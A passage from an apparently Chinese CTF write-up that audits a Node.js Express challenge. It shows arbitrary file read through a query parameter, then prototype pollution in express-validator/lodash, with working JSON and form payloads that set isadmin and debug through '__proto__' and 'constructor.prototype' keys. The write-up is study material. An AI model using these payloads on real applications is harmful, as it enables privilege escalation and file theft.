punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"notadmin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'verify'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'verify success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//req.session.debug = true;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg<span class="token punctuation">;</span>    <span class="token keyword">var</span> imgdata <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">:</span> <span class="token string">"./images/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> base64data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>imgdata<span class="token punctuation">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'我的空间'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">,</span> png<span class="token operator">:</span> <span class="token string">"data:image/png;base64,"</span> <span class="token operator">+</span> base64data<span class="token punctuation">,</span> diy<span class="token operator">:</span> <span class="token string">"十年磨一剑😅v0.0.0(尚处于开发版"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> info<span class="token punctuation">.</span>pretty <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>p<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy<span class="token punctuation">;</span>      info<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy<span class="token operator">:</span> <span class="token string">"尊贵的admin"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'plz login first'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>/app/app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session'</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> secrets <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> key<span class="token punctuation">,</span>  secret<span class="token operator">:</span> secrets<span class="token punctuation">,</span>  store<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">sessionStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  cookie<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    maxAge<span class="token operator">:</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">600</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// view engine setup</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">logger</span><span class="token punctuation">(</span><span class="token string">'dev'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> indexRouter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// set locals, only providing error in development</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>message <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>error <span class="token operator">=</span> req<span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'development'</span> <span class="token operator">?</span> err <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app<span class="token punctuation">;</span></code></pre><p>本地安装一下环境</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"express-validator"</span><span class="token operator">:</span> <span class="token string">"^6.12.1"</span><span class="token punctuation">,</span>    <span class="token property">"http-errors"</span><span class="token operator">:</span> <span class="token string">"^1.8.0"</span><span class="token punctuation">,</span>    <span class="token property">"morgan"</span><span class="token operator">:</span> <span class="token string">"^1.10.0"</span><span class="token punctuation">,</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>    <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"^2.88.2"</span><span class="token punctuation">,</span>    <span class="token property">"session-file-store"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="第二步-代码审计"><a href="#第二步-代码审计" class="headerlink" title="第二步 - 代码审计"></a>第二步 - 代码审计</h3><p>根据源码可以发现，题目要求我们以admin身份登陆，但是admin的密码又是随机不可能破解的</p><img src="/article/2021dfjk/image-20210803143641462.png" class="" title="image-20210803143641462" loading="lazy"><p>跟到<code>/verify</code>路由，可以看到如果<code>session.username</code>是admin就将<code>isadmin</code>赋值admin，否则就是notadmin </p><img src="/article/2021dfjk/image-20210803143743000.png" class="" title="image-20210803143743000" loading="lazy"><p>再继续跟进到<code>/admin</code>路由 ，发现任意文件读取漏洞的源码。关键点在于下一步，如果<code>isadmin</code><strong>只要不是</strong>notadmin就会执行一段操作，所以我们的下一个目标就是令<code>isadmin</code>变为非notadmin</p><img src="/article/2021dfjk/image-20210803144118578.png" class="" title="image-20210803144118578" loading="lazy"><p>admin的密码每次都是随机的，所以出题人根本不想让我们登陆获得admin，也不可能登陆admin。所以得另想方法，我们的关键点就在于让<code>isadmin</code>不是notadmin，而<code>isadmin</code>又是在<code>/verify</code>路由下才创建的，如果改变原型对象的内容让<code>isadmin</code>提前创建，这样就达到了污染，从而让<code>isadmin</code>变为非notadmin</p><p>图为 <a href="www.mrkaixin.top">@Mrkaixin</a> 师傅给出的session样子</p><img src="/article/2021dfjk/image-20210803144614812.png" class="" title="image-20210803144614812" loading="lazy"><h3 id="第三步-原型链污染"><a href="#第三步-原型链污染" class="headerlink" title="第三步 - 原型链污染"></a>第三步 - 原型链污染</h3><p>根据读到的package包引用，发现lodash版本为4.17.15。lodash&lt;4.17.17是有原型链污染漏洞的</p><img src="/article/2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png" class="" title="E34B2280959DFF59059010F95FFB5E8C" loading="lazy"><p>这里给出<a href="https://paper.seebug.org/1426/">参考文章</a>引用部分，写的很详细，参考文章在文末</p><blockquote><p>测试数据包：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__[test]"</span><span class="token operator">:</span> <span class="token string">"123 "</span><span class="token punctuation">&#125;</span></code></pre><p>这里在segments.reduce函数中对输入的值进行了一些判断和替换。重要的点就是当传入的键中存在<code>.</code> ，则会在字符两边加上<code>[&quot; &quot;]</code>，并且最终返回的是一个字符串形式的结果。</p><p>接着之前的过程，在经过了过滤器的处理之后，会通过lodash.set对指定的path设置新值</p><img src="/article/2021dfjk/1607915420000-16044095450346.jpg-w331s" class="" title="-w1160" loading="lazy"><p>尝试污染<strong>proto</strong>[test]，结果发现是污染并没有成功，原因是因为，当lodash.set中第一个参数存在一个与第二个参数同名的键时，污染就会失败</p><p>所以，我们就要尝试去绕过这个点。 我们来看一下这个语句：</p><pre class="language-none"><code class="language-none">path !&#x3D;&#x3D; &#39;&#39; ? _.set(req[location], path, newValue) : _.set(req, location, newValue);</code></pre><p>这里的第一个参数是从请求中直接取出来的，path是经过先前处理后的出来的值。所以能不能通过这个处理来进行绕过呢？当然是可以的。 当我们传入：</p><pre class="language-none"><code class="language-none">&#123;&quot;\&quot;].__proto__[\&quot;test&quot;:&quot;123 &quot;&#125;</code></pre><p>这里的键为<code>&quot;].__proto__[&quot;test</code>，由于字符里面存在<code>.</code>，所以在segments.reduce函数处理时会对其左右加双引号和中括号，最终变成：<code>[&quot;&quot;].__proto__[&quot;test&quot;]</code>。</p><p>这时就不存在同名的键了，于是查看污染的后的值发现：</p><img src="/article/2021dfjk/1607915421000-16044107085533.jpg-w331s" class="" title="-w426" loading="lazy"><p>我们设置的值并没有传递进去，而是污染为了一个空值。为什么传递进来的newValue为空值呢？</p><p>从select-fields.js中可以看到，是因为取值时，使用的是lodash.get方法从<code>req[&#39;body&#39;]</code>中取被处理后的键值，处理后的键是不存在的，所以取出来的值就为undefined。当undefined传递到Sanitization.run方法中后，经过了一个<code>.toString()</code>的处理变成了<code>&#39;&#39;</code>空字符串。</p><p>利用lodash.get方法中读取键值的妙用得到最终的payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"testvalue"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token property">"a\"].__proto__[\"test"</span><span class="token operator">:</span> <span class="token number">222</span><span class="token punctuation">&#125;</span></code></pre><p>详细可在参考文章中查看</p></blockquote><p>于是进行测试</p><p>测试代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">9001</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    extended<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">,</span>    validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span>middlewares <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">"hellowrold"</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>lod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>lod<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"__proto__[isadmin]"</span><span class="token punctuation">,</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre><p>根据原payload，可以发现，这里用json格式post的请求成功达到了目的，并且还能进行覆盖</p><img src="/article/2021dfjk/image-20210803151756631.png" class="" title="image-20210803151756631" loading="lazy"><p>但是问题在于题目是不解析json请求的，因此不能使用这种方式构造原型链污染</p><img src="/article/2021dfjk/image-20210803152057397.png" class="" title="image-20210803152057397" loading="lazy"><p>反思：比赛中由于未仔细审查代码，导致以为必须要覆盖为admin才行，错失了大量时间，其实只要是非notadmin就行</p><p>最终测试如下</p><img src="/article/2021dfjk/image-20210803151332184.png" class="" title="image-20210803151332184" loading="lazy"><p>Payload:<code>&quot;.constructor.prototype[&quot;xxx</code> </p><p>利用这样的构造器去达到覆盖<code>xxx</code>的目的，<code>.__proto__.</code> 这样是不行的</p><img src="/article/2021dfjk/image-20210803152912326.png" class="" title="image-20210803152912326" loading="lazy"><p>原型链污染成功</p><img src="/article/2021dfjk/image-20210803152818280.png" class="" title="image-20210803152818280" loading="lazy"><h3 id="第四步-命令执行"><a href="#第四步-命令执行" class="headerlink" title="第四步 - 命令执行"></a>第四步 - 命令执行</h3><p>继续看代码，发现<code>session.debug</code>后将<code>query</code>请求的<code>p</code>赋到了<code>info.pretty</code>里。</p><img src="/article/2021dfjk/image-20210803153247822.png" class="" title="image-20210803153247822" loading="lazy"><hr><p>要达到p，首先要覆盖<code>session.debug</code>，所以上一步最终payload为</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span><span class="token number">112222</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>a<span class="token double-quoted-string string">".constructor.prototype["</span>isadmin<span class="token operator">=</span><span class="token operator">&amp;</span>a<span class="token double-quoted-string string">".constructor.prototype["</span>debug<span class="token operator">=</span></code></pre><hr><p>利用文件读取读到了<code>/app/view/admin.pug</code></p><pre class="language-pug" data-language="pug"><code class="language-pug"><span class="token tag">html</span>  <span class="token tag">head</span>    <span class="token tag">title</span><span class="token punctuation">=</span><span class="token code"> title</span>    <span class="token tag">meta<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">http-equiv</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"Content-Type"</span></span><span class="token punctuation">,</span> <span class="token attr-name">content</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text/html;charset=UTF-8"</span></span><span class="token punctuation">)</span></span></span>  <span class="token tag">body</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">hello</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></span>      <span class="token tag">p</span><span class="token punctuation">=</span><span class="token code"> text</span>      <span class="token tag">div</span> <span class="token plain-text">#&#123;msg&#125;</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>      <span class="token tag">div</span> <span class="token plain-text">个性签名：</span>        <span class="token tag">div</span> <span class="token plain-text">#&#123;diy&#125;</span>        <span class="token tag">div</span> <span class="token plain-text">---#&#123;msg&#125;</span>    <span class="token tag">form<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">action</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">""</span></span><span class="token punctuation">,</span> <span class="token attr-name">method</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"get"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">div</span> <span class="token plain-text">更改图片</span>        <span class="token tag">select<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"newimg"</span></span><span class="token punctuation">)</span></span></span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span 